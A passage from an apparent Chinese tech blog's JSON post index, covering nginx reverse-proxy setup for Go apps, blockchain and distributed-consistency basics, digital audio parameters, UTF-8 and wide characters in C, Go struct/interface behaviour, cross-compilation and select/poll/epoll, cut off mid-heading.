所有的配置文件都在/etc/nginx下，并且每个虚拟主机已经安排在了/etc/nginx/sites-available下\n\n  ● 程序文件在/usr/sbin/nginx\n\n  ● 日志放在了/var/log/nginx中\n\n  ● 并已经在/etc/init.d/下创建了启动脚本nginx\n\n  ● 默认的虚拟主机的目录设置在了/var/www/nginx-default (有的版本 默认的虚拟主机的目录设置在了/var/www, 请参考/etc/nginx/sites-available里的配置)\n\n2 启动nginx\n\n```\nsudo /etc/init.d/nginx start\n```\n直接访问ip http://54.191.9.26/ 可以看到nginx安装成功\n\n\n3 处理golang\n\nGo 是一个独立的 HTTP 服务器，但是我们有些时候为了 nginx 可以帮我做很多工作，例如访问日志，cc 攻击，静态服务等，nginx 已经做的很成熟了，Go 只要专注于业务逻辑和功能就好，所以通过 nginx 配置代理就可以实现多应用同时部署，如下就是典型的两个应用共享 80 端口，通过不同的域名访问，反向代理到不同的应用。\n\n```\nserver {\n    listen       80;\n    server_name  .a.com;\n\n    charset utf-8;\n    access_log  /home/a.com.access.log;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_a/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8080;\n    }\n}\n\nserver {\n    listen       80;\n    server_name  .b.com;\n\n    charset utf-8;\n    access_log  /home/b.com.access.log  main;\n\n    location /(css|js|fonts|img)/ {\n        access_log off;\n        expires 1d;\n\n        root \"/path/to/app_b/static\";\n        try_files $uri @backend;\n    }\n\n    location / {\n        try_files /_not_exists_ @backend;\n    }\n\n    location @backend {\n        proxy_set_header X-Forwarded-For $remote_addr;\n        proxy_set_header Host            $http_host;\n\n        proxy_pass http://127.0.0.1:8081;\n    }\n}\n```\n\n> 自己的配置\n\nsudo vi /etc/nginx/sites-available/default\n\n把 default 注释掉\n\n```\nserver {\n        listen       80;\n        server_name  .xuanyueting.top;\n\n        charset utf-8;\n        access_log  /home/ubuntu/web/xuanyueting.log;\n\n        location /(css|js|fonts|img)/ {\n                access_log off;\n                expires 1d;\n\n                root \"/home/ubuntu/web/static\";\n                try_files $uri @backend;\n        }\n        location / {\n                try_files /_not_exists_ @backend;\n        }\n\n        location @backend {\n                proxy_set_header x-forwarded-for $remote_addr;\n                proxy_set_header host            $http_host;\n\n                proxy_pass http://127.0.0.1:8080;\n        }\n}\n```\n\n\n","tags":["golang"],"categories":["golang"]},{"title":"区块链基础","url":"%2Fp%2Feb2c6f22.html","content":"\n# 区块链\n\n区块链属于一种去中心化的记录技术。参与到系统上的节点，可能不属于同一组织、彼此无需信任；区块链数据由所有节点共同维护，每个参与维护节点都能复制获得一份完整记录的拷贝。\n\n### 特点\n跟传统的记账技术相比，其特点应该包括：\n\n* 维护一条不断增长的链，只可能添加记录，而发生过的记录都不可篡改；\n* 去中心化，或者说多中心化，无需集中的控制而能达成共识，实现上尽量分布式；\n* 通过密码学的机制来确保交易无法抵赖和破坏，并尽量保护用户信息和记录的隐私性。\n\n\n### 基本原理\n区块链的基本原理理解起来并不难。基本概念包括：\n\n* 交易（Transaction）：一次操作，导致账本状态的一次改变，如添加一条记录；\n* 区块（Block）：记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识；\n* 链（Chain）：由一个个区块按照发生顺序串联而成，是整个状态变化的日志记录。\n<!-- more -->\n\n### 分类\n根据参与者的不同，可以分为公开（Public）链、联盟（Consortium）链和私有（Private）链。\n目前来看，公开链将会更多的吸引社区和媒体的眼球，但更多的商业价值应该在联盟链和私有链上。\n\n根据使用目的和场景的不同，又可以分为以数字货币为目的的货币链，以记录产权为目的的产权链，以众筹为目的的众筹链等。\n\n### 存储\n首先，区块链不是数据库。虽然区块链也可以用来存储数据，但它要解决的问题是多方的互信问题。单纯从存储数据角度，它的效率可能不高，笔者也不推荐把大量的原始数据放到区块链上。\n\n### 计算\n区块链技术还能带来更通用的计算能力。Hyperledger 和 Ethereum 就试图做类似的事情，基于区块链再做一层平台层，让别人基于平台开发应用变得更简单。\n\n\n\n\n# 分布式问题\n\n### 一致性\n\n理想的分布式系统一致性应该满足：\n\n* 可终止性（Termination）：一致的结果在有限时间内能完成；\n* 共识性（Consensus）：不同节点最终完成决策的结果应该相同；\n* 合法性（Validity）：决策的结果必须是其它进程提出的提案。\n\n\n实际上，越强的一致性要求往往意味着越弱的性能。\n\n\n### FLP 不可能性原理\n\nFLP 不可能原理：在网络可靠，存在节点失效（即便只有一个）的最小化异步模型系统中，不存在一个可以解决一致性问题的确定性算法。\n\nFLP 不可能原理实际上告诉人们，不要浪费时间去为异步分布式系统设计在任意场景下都能实现共识的算法。\n\n\n### CAP 原理\n\n* 一致性（Consistency）：任何操作应该都是原子的，发生在后面的事件能看到前面事件发生导致的结果，注意这里指的是强一致性；\n* 可用性（Availablity）：在有限时间内，任何非失败节点都能应答请求；\n* 分区容忍性（Partition）：网络可能发生分区，即节点之间的通信不可保障。\n\n1. 弱化一致性  对结果一致性不敏感的应用，可以允许在新版本上线后过一段时间才更新成功，期间不保证一致性。\n\n2. 弱化可用性  对结果一致性很敏感的应用，例如银行取款机，当系统故障时候会拒绝服务。MongoDB、Redis 等为此设计。Paxos、Raft 等算法，主要处理这种情况。\n\n3. 弱化分区容忍性  现实中，网络分区出现概率减小，但较难避免。某些关系型数据库、ZooKeeper 即为此设计。\n\n\n### ACID 原则\n\n\n即 Atomicity（原子性）、Consistency（一致性）、Isolation（隔离性）、Durability（持久性）。\n\nACID 原则描述了对分布式数据库的一致性需求，同时付出了可用性的代价。\n\n* Atomicity：每次操作是原子的，要么成功，要么不执行；\n* Consistency：数据库的状态是一致的，无中间状态；\n* Isolation：各种操作彼此互相不影响；\n* Durability：状态的改变是持久的，不会失效。\n\n一个与之相对的原则是 BASE（Basic Availiability，Soft state，Eventually Consistency），牺牲掉对一致性的约束（最终一致性），来换取一定的可用性。\n\n\n# 密码学\n\n\n### hash\n\n一个优秀的 hash 算法，将能实现：\n\n* 正向快速：给定明文和 hash 算法，在有限时间和有限资源内能计算出 hash 值。\n* 逆向困难：给定（若干） hash 值，在有限时间内很难（基本不可能）逆推出明文。\n* 输入敏感：原始输入信息修改一点信息，产生的 hash 值看起来应该都有很大不同。\n* 冲突避免：很难找到两段内容不同的明文，使得它们的 hash 值一致（发生冲突）\n\n\n\n### 加解密\n\n根据加解密的密钥是否相同，算法可以分为对称加密（symmetric cryptography，又称公共密钥加密，common-key cryptography）和非对称加密(asymmetric cryptography，又称公钥加密，public-key cryptography)。两种模式适用于不同的需求，恰好形成互补，很多时候也可以组合使用，形成混合加密机制。\n\n\n* 对称加密\n\n优点是加解密效率高（速度快，空间占用小），加密强度高。\n\n缺点是参与多方都需要持有密钥，一旦有人泄露则安全性被破坏；另外如何在不安全通道下分发密钥也是个问题。\n\n适用于大量数据的加解密；不能用于签名场景；需要提前分发密钥。\n\n* 非对称加密\n\n非对称加密是现代密码学历史上最为伟大的发明，可以很好的解决对称加密需要的提前分发密钥问题。\n\n顾名思义，加密密钥和解密密钥是不同的，分别称为公钥和私钥。\n公钥一般是公开的，人人可获取的，私钥一般是个人自己持有，不能被他人获取。\n优点是公私钥分开，不安全通道也可使用。\n缺点是加解密速度慢，一般比对称加解密算法慢两到三个数量级；同时加密强度相比对称加密要差。\n\n一般适用于签名场景或密钥协商，不适于大量数据的加解密。\n\n* 混合加密机制\n\n即先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短的多），然后双方再通过对称加密对传递的大量数据进行加解密处理。\n\n典型的场景是现在大家常用的 HTTPS 机制。\n\n\n\n","tags":["区块链"],"categories":["计算机基础"]},{"title":"音频基础","url":"%2Fp%2F279c3cd4.html","content":"\n\n### 音频基础\n\n当前，我们所说的音频，都是数字音频。数字音频由采样频率、采样精度、声音通道数三个部分组成。\n\n采样频率：既采样率，指记录声音时每秒的采样个数，它用赫兹(Hz)来表示。\n采样精度：指记录声音的动态范围，它以位(Bit)为单位。\n声音通道：既声道数（1-8个）。\n\n采样率根据使用类型不同大概有以下几种（k既千位符号，1khz=1000hz）：\n8khz：电话等使用，对于记录人声已经足够使用。\n22.05khz：广播使用频率。\n44.1kb：音频CD。\n48khz：DVD、数字电视中使用。\n96khz-192khz：DVD-Audio、蓝光高清等使用。\n\n采样精度常用范围为8bit-32bit，而CD中一般都使用16bit。\n<!-- more -->\n\n\n音频的比特率，实际上就是压缩比例。\n但比特率本身并不对文件的质量有直接影响，例如我们把128kb的文件作为源文件，即使转换成320kb的文件，其音质依然不会比128kb好。\n那么比特率中的数字和字母到底是什么意思呢？首先看128k的全称“128kbps”，我们试着分解一下：128是数字，k是千位符，b是单位，s是秒，ps其实就是“/s”。这样来看，128kbps就是128kb/s。也就是每秒128kb。\n\n\n\n### speex格式录音参数:\n\n```\nquality = 9  \t                       \t\t//speex质量,值越大质量越好,文件越大  open()的参数\nspeex_version = \"speex-1.2rc\"      //speex版本\nospeex_version_id = 1 \t\t\t//speex版本id\nheader_size = 80 \t \t\t\t//speex头信息大小\nrate = 16000\t\t\t\t\t//采样率大小\nmode = 1\t\t\t \t\t\t//mode  0是窄带模式, 1是宽带模式 (0=NB, 1=WB, 2=UWB)\nbitrate = -1 \t\t \t\t\t//比特率\nframe_size = 320   \t \t\t\t//缓冲区大小  窄带对应160, 宽带对应320  (NB=160, WB=320, UWB=640)\nvbr = 1\t\t\t\t\t\t//是否使用可变比特率\nnframes  = 1 \t\t\t\t\t// 每帧的speex包的数量\nchannels =1    \t\t\t        //音频输入的声道 \t1是单声道，2是立体声\n```","tags":["音频"],"categories":["计算机基础"]},{"title":"字符编码","url":"%2Fp%2Febfb97d0.html","content":"\n### ASCII码\nASCII码的取值范围是0~127，可以用7个bit表示。C语言中char型变量的大小规定为一字节，如果存放ASCII码则只用到低7位，高位为0。以下是ASCII码表：\n\n\n绝大多数计算机的一个字节是8位，取值范围是0~255，而ASCII码并没有规定编号为128~255的字符，为了能表示更多字符，各厂商制定了很多种ASCII码的扩展规范。注意，虽然通常把这些规范称为扩展ASCII码（Extended ASCII），但其实它们并不属于ASCII码标准。\n\n<!-- more -->\n\n### Unicode和UTF-8\n\n为了统一全世界各国语言文字和专业领域符号（例如数学符号、乐谱符号）的编码，ISO制定了ISO 10646标准，也称为UCS（Universal Character Set）。UCS编码的长度是31位，可以表示231个字符。如果两个字符编码的高位相同，只有低16位不同，则它们属于一个平面（Plane），所以一个平面由216个字符组成。目前常用的大部分字符都位于第一个平面（编码范围是U-00000000~U-0000FFFD），称为BMP（Basic Multilingual Plane）或Plane 0，为了向后兼容，其中编号为0~256的字符和Latin-1相同。UCS编码通常用U-xxxxxxxx这种形式表示，而BMP的编码通常用U+xxxx这种形式表示，其中x是十六进制数字。在ISO制定UCS的同时，另一个由厂商联合组织也在着手制定这样的编码，称为Unicode，后来两家联手制定统一的编码，但各自发布各自的标准文档，所以UCS编码和Unicode码是相同的。\n\n\n有了字符编码，另一个问题就是这样的编码在计算机中怎么表示。现在已经不可能用一个字节表示一个字符了，最直接的想法就是用四个字节表示一个字符，这种表示方法称为UCS-4或UTF-32，UTF是Unicode Transformation Format的缩写。一方面这样比较浪费存储空间，由于常用字符都集中在BMP，高位的两个字节通常是0，如果只用ASCII码或Latin-1，高位的三个字节都是0。另一种比较节省存储空间的办法是用两个字节表示一个字符，称为UCS-2或UTF-16，这样只能表示BMP中的字符，但BMP中有一些扩展字符，可以用两个这样的扩展字符表示其它平面的字符，称为Surrogate Pair。无论是UTF-32还是UTF-16都有一个更严重的问题是和C语言不兼容，在C语言中0字节表示字符串结尾，库函数strlen、strcpy等等都依赖于这一点，如果字符串用UTF-32存储，其中有很多0字节并不表示字符串结尾，这就乱套了。\n\n\n\nUNIX之父Ken Thompson提出的UTF-8编码很好地解决了这些问题，现在得到广泛应用。\n\nUTF-8具有以下性质：\n\n\n  ● 编码为U+0000~U+007F的字符只占一个字节，就是0x00~0x7F，和ASCII码兼容。\n  \n  ● 编码大于U+007F的字符用2~6个字节表示，每个字节的最高位都是1，而ASCII码的最高位都是0，因此非ASCII码字符的表示中不会出现ASCII码字节（也就不会出现0字节）。\n  \n  ● 用于表示非ASCII码字符的多字节序列中，第一个字节的取值范围是0xC0~0xFD，根据它可以判断后面有多少个字节也属于当前字符的编码。后面每个字节的取值范围都是0x80~0xBF，见下面的详细说明。\n  \n  ● UCS定义的所有231个字符都可以用UTF-8编码表示出来。\n  \n  ● UTF-8编码最长6个字节，BMP字符的UTF-8编码最长三个字节。\n  \n  ● 0xFE和0xFF这两个字节在UTF-8编码中不会出现。\n\n具体来说，UTF-8编码有以下几种格式：\n\n```\nU-00000000 – U-0000007F:  0xxxxxxx\nU-00000080 – U-000007FF:  110xxxxx 10xxxxxx\nU-00000800 – U-0000FFFF:  1110xxxx 10xxxxxx 10xxxxxx\nU-00010000 – U-001FFFFF:  11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-00200000 – U-03FFFFFF:  111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\nU-04000000 – U-7FFFFFFF:  1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx\n```\n第一个字节要么最高位是0（ASCII字节），要么最高两位都是1，\n\n最高位之后1的个数决定后面有多少个字节也属于当前字符编码，例如111110xx，最高位之后还有四个1，表示后面有四个字节也属于当前字符的编码。后面每个字节的最高两位都是10，可以和第一个字节区分开。这样的设计有利于误码同步，例如在网络传输过程中丢失了几个字节，很容易判断当前字符是不完整的，也很容易找到下一个字符从哪里开始，结果顶多丢掉一两个字符，而不会导致后面的编码解释全部混乱了。上面的格式中标为x的位就是UCS编码，最后一种6字节的格式中x位有31个，可以表示31位的UCS编码，UTF-8就像一列火车，第一个字节是车头，后面每个字节是车厢，其中承载的货物是UCS编码。UTF-8规定承载的UCS编码以大端表示，也就是说第一个字节中的x是UCS编码的高位，后面字节中的x是UCS编码的低位。\n例如U+00A9（©字符）的二进制是10101001，编码成UTF-8是11000010 10101001（0xC2 0xA9），但不能编码成11100000 10000010 10101001，UTF-8规定每个字符只能用尽可能少的字节来编码。\n\n\n```\n10101001\n11000010 10101001     \t           // 大端也符合阅读规范\n\n\n10101001\n11100000 10000010 10101001   //这样不可以, 用尽可能少的字节来编码\n```\n\n\n\n### 在Linux C编程中使用Unicode和UTF-8\n\n目前各种Linux发行版都支持UTF-8编码，当前系统的语言和字符编码设置保存在一些环境变量中，可以通过locale命令查看：\n\n```\n$ locale\nLANG=en_US.UTF-8\nLC_CTYPE=\"en_US.UTF-8\"\nLC_NUMERIC=\"en_US.UTF-8\"\nLC_TIME=\"en_US.UTF-8\"\nLC_COLLATE=\"en_US.UTF-8\"\nLC_MONETARY=\"en_US.UTF-8\"\nLC_MESSAGES=\"en_US.UTF-8\"\nLC_PAPER=\"en_US.UTF-8\"\nLC_NAME=\"en_US.UTF-8\"\nLC_ADDRESS=\"en_US.UTF-8\"\nLC_TELEPHONE=\"en_US.UTF-8\"\nLC_MEASUREMENT=\"en_US.UTF-8\"\nLC_IDENTIFICATION=\"en_US.UTF-8\"\nLC_ALL=\n```\n常用汉字也都位于BMP中，所以一个汉字的存储通常占3个字节。\n\n\n\n\n例如编辑一个C程序：\n\n```\n#include <stdio.h>\n\nint main(void)\n{\n\tprintf(\"你好\\n\");\n\treturn 0;\n}\n```\n源文件是以UTF-8编码存储的：\n\n```\n$ od -tc nihao.c \n0000000   #   i   n   c   l   u   d   e       <   s   t   d   i   o   .\n0000020   h   >  \\n  \\n   i   n   t       m   a   i   n   (   v   o   i\n0000040   d   )  \\n   {  \\n  \\t   p   r   i   n   t   f   (   \" 344 275\n0000060 240 345 245 275   \\   n   \"   )   ;  \\n  \\t   r   e   t   u   r\n0000100   n       0   ;  \\n   }  \\n\n0000107\n```\n其中八进制的344 375 240（十六进制e4 bd a0）就是“你”的UTF-8编码，八进制的345 245 275（十六进制e5 a5 bd）就是“好”。把它编译成目标文件，\"你好\\n\"这个字符串就成了这样一串字节：e4 bd a0 e5 a5 bd 0a 00，汉字在其中仍然是UTF-8编码的，一个汉字占3个字节，这种字符在C语言中称为多字节字符（Multibyte Character）。运行这个程序相当于把这一串字节write到当前终端的设备文件。如果当前终端的驱动程序能够识别UTF-8编码就能打印出汉字，如果当前终端的驱动程序不能识别UTF-8编码（比如一般的字符终端）就打印不出汉字。也就是说，像这种程序，识别汉字的工作既不是由C编译器做的也不是由libc做的，C编译器原封不动地把源文件中的UTF-8编码复制到目标文件中，libc只是当作以0结尾的字符串原封不动地write给内核，识别汉字的工作是由终端的驱动程序做的。\n\n\n\n但是仅有这种程度的汉字支持是不够的，有时候我们需要在C程序中操作字符串里的字符，比如求字符串\"你好\\n\"中有几个汉字或字符，用strlen就不灵了，因为strlen只看结尾的0字节而不管字符串里存的是什么，求出来的是字节数7。为了在程序中操作Unicode字符，C语言定义了宽字符（Wide Character）类型wchar_t和一些库函数。\n\n\n在字符常量或字符串字面值前面加一个L就表示宽字符常量或宽字符串，例如定义wchar_t c = L'你';，变量c的值就是汉字“你”的31位UCS编码，而L\"你好\\n\"就相当于{L'你', L'好', L'\\n', 0}，wcslen函数就可以取宽字符串中的字符个数。\n\n\n```\n#include <stdio.h>\n#include <locale.h>\n\nint main(void)\n{\n\tif (!setlocale(LC_CTYPE, \"\")) {\n\t\tfprintf(stderr, \"Can't set the specified locale! \"\n\t\t\t\"Check LANG, LC_CTYPE, LC_ALL.\\n\");\n\t\treturn 1;\n\t}\n\tprintf(\"%ls\", L\"你好\\n\");\n\treturn 0;\n}\n```\n\n宽字符串L\"你好\\n\"在源代码中当然还是存成UTF-8编码的，但编译器会把它变成4个UCS编码0x00004f60 0x0000597d 0x0000000a 0x00000000保存在目标文件中，按小端存储就是60 4f 00 00 7d 59 00 00 0a 00 00 00 00 00 00 00，用od命令查看目标文件应该能找到这些字节。\n\n\nprintf的%ls转换说明表示把后面的参数按宽字符串解释，不是见到0字节就结束，而是见到UCS编码为0的字符才结束，但是要write到终端仍然需要以多字节编码输出，这样终端驱动程序才能识别，所以printf在内部把宽字符串转换成多字节字符串再write出去。事实上，C标准并没有规定多字节字符必须以UTF-8编码，也可以使用其它的多字节编码，在运行时根据环境变量确定当前系统的编码，所以在程序开头需要调用setlocale获取当前系统的编码设置，如果当前系统是UTF-8的，printf就把UCS编码转换成UTF-8编码的多字节字符串再write出去。一般来说，程序在做内部计算时通常以宽字符编码，如果要存盘或者输出给别的程序，或者通过网络发给别的程序，则采用多字节编码。","tags":["字符"],"categories":["计算机基础"]},{"title":"golang_struct_interface嵌套传参和多态","url":"%2Fp%2Fa5099912.html","content":"\n\n# 1. interface struct 能否相互嵌套\n\n1. struct struct //继承(不能多态), 如果内部struct实现了接口, 它也相当于实现了接口\n2. struct interface //可以多态\n3. interface interface  //单纯的导入\n4. interface struct  //不允许\n\n<!-- more -->\n\n# 2. struct方法参数定义指针还是值 \n\n无论方法参数定义成指针还是值, 都可以调用\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype S struct {\n\tage int\n}\n\nfunc (s S) Value() {\n\tfmt.Println(s.age)\n}\n\nfunc (s *S) Point(age int) {\n\ts.age = age\n}\n\nfunc main() {\n\n\t// 自己是指针, 能够调用一切\n\ts := new(S)\n\ts.Point(1)\n\ts.Value()      //1\n\tfmt.Println(s) //&{1}\n\n\t// 自己不是指针,也能调用指针函数修改值\n\tv := S{}\n\tv.Point(2)\n\tv.Value()      //2\n\tfmt.Println(v) //{2}\n}\n```\n\n\n\n# 3. interface 能否赋值实现了的 struct\n\n### 3.1 struct是值的都可以赋值\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\ti = S{}\n\ti.Get() // get\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n### 3.2 struct是指针的只能指针赋值\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tGet()\n}\ntype S struct {\n}\n\nfunc (s *S) Get() {\n\tfmt.Println(\"get\")\n}\n\nfunc main() {\n\n\tvar i I\n\n\t//i = S{} //此处不能赋值\n\t//i.Get()\n\n\ti = &S{}\n\ti.Get() //get\n}\n```\n\n\n\n# 4. golang假多态\n\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype P interface {\n\tSay()\n}\ntype P1 struct{}\ntype P2 struct{}\n\nfunc (p *P1) Say() {\n\tfmt.Println(\"say p1\")\n}\nfunc (p *P2) Say() {\n\tfmt.Println(\"say p2\")\n}\n\nfunc main() {\n\tp1 := &P1{}\n\tp2 := &P2{}\n\n\tvar p P\n\tp = p1\n\tp.Say() // say p1\n\tp = p2\n\tp.Say() // say p2\n}\n```\n\n\n\n# 5. 非运行时多态\n\ngo 语言中，当子类调用父类方法时，“作用域”将进入父类的作用域，看不见子类的方法存在\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang多平台交叉编译","url":"%2Fp%2F37af4aa1.html","content":"\n\n### cannot execute binary file exec format error\n\n是因为mac和ubuntu的二进制格式不一致\n\n\n### 问题\n\nGo是一门编译型语言，所以在不同平台上，需要编译生成不同格式的二进制包。\n由于Go 1.5对跨平台编译有了一些改进，包括统一了编译器、链接器等。\n编译时候只需要指定两个参数：GOOS和GOARCH即可。\n\n\n<!-- more -->\n\n\n### 编译到 linux 64bit\n```\n$ GOOS=linux GOARCH=amd64 go build\n```\n### 或者可以使用 -o 选项指定生成二进制文件名字\n```\n$ GOOS=linux GOARCH=amd64 go build -o app.linux\n```\n### 编译到 linux 32bit\n```\n$ GOOS=linux GOARCH=386 go build\n```\n### 编译到 windows 64bit\n```\n$ GOOS=windows GOARCH=amd64 go build\n```\n\n### 编译到 windows 32bit\n```\n$ GOOS=windows GOARCH=386 go build\n```\n\n### 编译到 Mac OS X 64bit\n```\n$ GOOS=darwin GOARCH=amd64 go build\n```","tags":["golang"],"categories":["golang"]},{"title":"io多路复用select_poll_epoll","url":"%2Fp%2F457c2d1f.html","content":"\n\n\n# 1. IO分类\n\n#### 1.1 同步IO\n\n进程也可以换成线程\n\n+ 阻塞IO (问一次 + 傻等)\n\n  进程 在阻塞IO读 recvfrom 操作的两个阶段都是等待的。\n\n  + 在数据没准备好的时候，process原地等待kernel准备数据。\n\n  + kernel准备好数据后，process继续等待kernel将数据copy到自己的buffer。在kernel完成数据的copy后process才会从recvfrom系统调用中返回。\n\n  <!-- more -->\n\n+ 非阻塞IO (不停的催问 + 傻等)\n\n  进程在非阻塞IO读 recvfrom 操作的第一个阶段是不会等待的。\n\n  + 如果kernel数据还没准备好，那么recvfrom会立刻返回一个EWOULDBLOCK错误。\n\n  + 当kernel准备好数据后，进入处理的第二阶段的时候，process会等待kernel将数据copy到自己的buffer，在kernel完成数据的copy后process才会从recvfrom系统调用中返回。\n\n+ IO多路复用 (一个家长拦截 + 谁好了谁干活)\n\n  在IO多路复用的时候，进程在两个处理阶段都是等待的。\n  \n  初看好像IO多路复用没什么用，其实select、poll、epoll的优势在于 **可以以较少的代价来同时监听处理多个IO。**\n\n\n\n### 1.2 异步IO\n\n异步IO要求进程 在recvfrom操作的两个处理阶段上都不能等待。\n\n也就是process调用recvfrom后立刻返回，kernel自行去准备好数据并将数据从kernel的buffer中copy到process的buffer在通知process读操作完成了，然后process在去处理。\n\n遗憾的是，linux的网络IO中是不存在异步IO的，linux的网络IO处理的第二阶段总是阻塞等待数据copy完成的。真正意义上的网络异步IO是Windows下的IOCP（IO完成端口）模型。\n\n很多时候，我们比较容易混淆 非阻塞 IO和 异步 IO，其实它俩是有区别的。\n\n+ 其实 非阻塞 IO仅仅要求处理的第一阶段不 block即可。\n+ 异步 IO 要求两个阶段都不能block住。\n\n\n\n### 1.3 总结\n\n有人会说，非阻塞 IO并没有被block啊。这里有个非常“狡猾”的地方，定义中所指的”IO operation”是指真实的IO操作，就是例子中的recvfrom这个system call。\n\n非阻塞 IO在执行recvfrom这个system call的时候，如果kernel的数据没有准备好，这时候不会block进程。\n\n但是，当kernel中数据准备好的时候，recvfrom会将数据从kernel拷贝到用户内存中，这个时候进程是被block了，在这段时间内，进程是被block的。\n\n\n\n# 2. IO多路复用\n\n### 2.1 select 调用后阻塞, 等待文件描述符就绪返回, 然后遍历获取\n\n`int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);`\n\nselect 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述副就绪（有数据 可读、可写、或者有except），或者超时（timeout指定等待时间，如果立即返回设为null即可），函数返回。当select函数返回后，可以 通过遍历fdset，来找到就绪的描述符。\n\n\n\n当用户进程调用select的时候，select会将需要监控的 readfds 集合拷贝到内核空间（假设监控的仅仅是socket可读），然后遍历自己监控的socket sk，挨个调用sk的poll逻辑以便检查该sk是否有可读事件，遍历完所有的sk后，如果没有任何一个sk可读，那么select会调用schedule_timeout进入schedule循环，使得process进入睡眠。\n\n如果在timeout时间内某个sk上有数据可读了，或者等待timeout了，则调用select的进程会被唤醒，接下来select就是遍历监控的sk集合，挨个收集可读事件并返回给用户了\n\n1. 需要把文件描述符拷贝到内核\n2. fds集合有限制 1024\n3. 遍历效率低\n\n\n### 2.2 poll 只解除了select1024的限制\n\n`int poll(struct pollfd *fds, nfds_t nfds, int timeout);`\n\npoll和select非常相似，poll并没着手解决性能问题，poll只是解决了select的问题 fds集合大小1024限制问题。所以是个鸡肋。\n\npoll改变了fds集合的描述方式，使用了pollfd结构而不是select的fd_set结构，使得poll支持的fds集合限制远大于select的1024。\n\npoll虽然解决了fds集合大小1024的限制问题，但是，它并没改变大量描述符数组被整体复制于用户态和内核态的地址空间之间，以及个别描述符就绪触发整体描述符集合的遍历的低效问题。\n\npoll随着监控的socket集合的增加性能线性下降，poll不适合用于大并发场景。\n\n\n\n### 2.3 epoll\n\n+ `int epoll_create(int size)；`\n\n  创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大  新版本用红黑树,这个参数意义不大了\n\n+ `int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；`\n\n  + epfd：是epoll_create()的返回值。\n\n  + op：表示op操作，分别添加、删除和修改对fd的监听事件。\n\n    + 添加EPOLL_CTL_ADD，\n    + 删除EPOLL_CTL_DEL，\n    + 修改EPOLL_CTL_MOD。\n\n  + fd：是需要监听的fd（文件描述符）\n\n  + epoll_event：是告诉内核需要监听什么事，struct epoll_event结构如下：\n\n    ```c\n    struct epoll_event {\n      __uint32_t events;  /* Epoll events */\n      epoll_data_t data;  /* User data variable */\n    };\n    ```\n\n    events可以是以下几个宏的集合：\n\n    + EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；\n    + EPOLLOUT：表示对应的文件描述符可以写；\n    + EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；\n    + EPOLLERR：表示对应的文件描述符发生错误；\n    + EPOLLHUP：表示对应的文件描述符被挂断；\n    + EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。\n    + EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里\n\n\n\n+ `int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);`\n\n  等待epfd上的io事件，最多返回maxevents个事件。\n\n  参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size\n\n  参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。\n\n  该函数返回需要处理的事件数目，如返回0表示已超时。\n\n\n\n##### 2.3.1 epoll拷贝问题的解决\n\nepoll引入了epoll_ctl系统调用，将高频调用的epoll_wait和低频的epoll_ctl隔离开。同时，epoll_ctl通过(EPOLL_CTL_ADD、EPOLL_CTL_MOD、EPOLL_CTL_DEL)三个操作来分散对需要监控的fds集合的修改，做到了有变化才变更。\n\n将select或poll高频、大块内存拷贝(集中处理)变成epoll_ctl的低频、小块内存的拷贝(分散处理)，避免了大量的内存拷贝。\n\n\n\n\n同时，对于高频epoll_wait的可读就绪的fd集合返回的拷贝问题，epoll通过内核与用户空间mmap(内存映射)同一块内存来解决。mmap将用户空间的一块地址和内核空间的一块地址同时映射到相同的一块物理内存地址（不管是用户空间还是内核空间都是虚拟地址，最终要通过地址映射映射到物理地址），使得这块物理内存对内核和对用户均可见，减少用户态和内核态之间的数据交换。\n\n\n\n##### 2.3.2 